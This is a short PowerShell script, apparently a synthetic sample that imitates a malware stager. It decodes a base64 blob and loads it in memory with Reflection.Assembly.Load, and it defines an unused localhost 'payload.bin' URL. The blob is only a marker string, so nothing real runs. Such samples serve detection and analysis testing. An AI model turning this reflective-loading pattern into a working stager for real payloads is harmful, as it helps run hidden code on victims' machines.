
$TransferUrl = 'http://localhost:8080/payload.bin'
$ErrorActionPreference = "Stop"

try {
    $AssemblyBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjo5bTFwdmMzdmYz")
    Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
    $StageResult = [Reflection.Assembly]::Load($AssemblyBytes)
    if ($null -ne $StageResult) {
        Write-Verbose ("Loaded assembly: " + $StageResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Start-Sleep -Seconds 5
